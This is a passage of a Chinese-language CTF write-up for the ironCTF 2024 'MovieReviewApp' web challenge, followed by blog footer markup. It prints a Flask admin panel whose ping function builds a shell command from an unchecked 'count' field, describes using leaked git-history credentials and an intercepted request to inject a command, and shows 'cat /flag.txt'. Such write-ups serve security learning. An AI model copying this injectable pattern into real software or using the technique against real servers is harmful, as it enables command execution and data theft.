+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect, url_for, flash, session</span><br><span class="line">import psutil</span><br><span class="line">import os</span><br><span class="line">import platform</span><br><span class="line">import subprocess</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from dotenv import load_dotenv</span><br><span class="line"></span><br><span class="line">load_dotenv()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(32)</span><br><span class="line">ADMIN_USERNAME = os.getenv(&#x27;ADMIN_USERNAME&#x27;)</span><br><span class="line">ADMIN_PASSWORD =  os.getenv(&#x27;ADMIN_PASSWORD&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def home():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line">    </span><br><span class="line">@app.route(&#x27;/admin&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def admin():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">        password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:</span><br><span class="line">            session[&#x27;logged_in&#x27;] = True</span><br><span class="line">            return redirect(url_for(&#x27;admin_panel&#x27;))</span><br><span class="line">        else:</span><br><span class="line">            flash(&quot;Invalid credentials. Please try again.&quot;)</span><br><span class="line">    </span><br><span class="line">    return render_template(&#x27;login.html&#x27;)</span><br><span class="line"></span><br><span class="line">def ping_ip(ip, count):</span><br><span class="line">    if re.match(r&#x27;^((25[05]|(2[04]|1\d|[19]|)\d)\.?\b)&#123;4&#125;$&#x27;, ip):</span><br><span class="line">        return subprocess.check_output(f&quot;ping c &#123;count&#125; &#123;ip&#125;&quot;, shell=True).decode()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Invalid ip address and count!&quot;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin_panel&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def admin_panel():</span><br><span class="line">    if &#x27;logged_in&#x27; not in session:</span><br><span class="line">        return redirect(url_for(&#x27;admin&#x27;))</span><br><span class="line">    ping_result = None</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        ip = request.form.get(&#x27;ip&#x27;)</span><br><span class="line">        count = request.form.get(&#x27;count&#x27;, 1)</span><br><span class="line">        try:</span><br><span class="line">            ping_result = ping_ip(ip, count)</span><br><span class="line">        except ValueError:</span><br><span class="line">            flash(&quot;Count must be a valid integer&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            flash(f&quot;An error occurred: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    memory_info = psutil.virtual_memory()</span><br><span class="line">    memory_usage = memory_info.percent</span><br><span class="line">    total_memory = memory_info.total / (1024 ** 2) </span><br><span class="line">    available_memory = memory_info.available / (1024 ** 2) </span><br><span class="line">    return render_template(&#x27;admin.html&#x27;, ping_result=ping_result, </span><br><span class="line">                           memory_usage=memory_usage, total_memory=total_memory, </span><br><span class="line">                           available_memory=available_memory)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/logout&#x27;)</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&#x27;logged_in&#x27;, None)</span><br><span class="line">    return redirect(url_for(&#x27;admin&#x27;))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>查询git提交历史：</p>
+<p><img src="/images/migrated/18449823/09.png"></p>
+<p>获得用户名密码</p>
+<p><img src="/images/migrated/18449823/10.png"></p>
+<p>获得url路径</p>
+<p>前往<a target="_blank" rel="noopener" href="https://movie-review.1nf1n1ty.team/servermonitor/admin%E7%99%BB%E5%BD%95%E5%8D%B3%E5%8F%AF">https://movie-review.1nf1n1ty.team/servermonitor/admin登录即可</a></p>
+<p><img src="/images/migrated/18449823/11.png"></p>
+<p>让我想起了buuctf上的ping ping ping。看关键的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def ping_ip(ip, count):</span><br><span class="line">    if re.match(r&#x27;^((25[05]|(2[04]|1\d|[19]|)\d)\.?\b)&#123;4&#125;$&#x27;, ip):</span><br><span class="line">        return subprocess.check_output(f&quot;ping c &#123;count&#125; &#123;ip&#125;&quot;, shell=True).decode()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Invalid ip address and count!&quot;</span><br></pre></td></tr></table></figure>
+
+<p>只对ip进行了严格的过滤。而count<strong>理论上</strong>只能是数字（但只是前端限制）所以没有过滤。</p>
+<p>burp抓包改一下出</p>
+<p><img src="/images/migrated/18449823/12.png"></p>
+<p>cat &#x2F;flag.txt</p>
+<p><img src="/images/migrated/18449823/13.png"></p>
+<p><strong>ironCTF{4lways_b3_c4ar3ful_w1th_G1t!}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-Hunt"><span class="toc-number">1.1.</span> <span class="toc-text">JWT Hunt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mango"><span class="toc-number">1.2.</span> <span class="toc-text">Mango</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loan-App"><span class="toc-number">1.3.</span> <span class="toc-text">Loan App</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b64SiteViewer"><span class="toc-number">1.4.</span> <span class="toc-text">b64SiteViewer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cerealShop"><span class="toc-number">1.5.</span> <span class="toc-text">cerealShop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MovieReviewApp"><span class="toc-number">1.6.</span> <span class="toc-text">MovieReviewApp</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&text=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&is_video=false&description=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ironCTF 2024 WEB EICS1 部分wp&body=Check out this article: https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&title=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&name=ironCTF 2024 WEB EICS1 部分wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-10-07-ironctf-2024-web-eics1-wp/&t=ironCTF 2024 WEB EICS1 部分wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
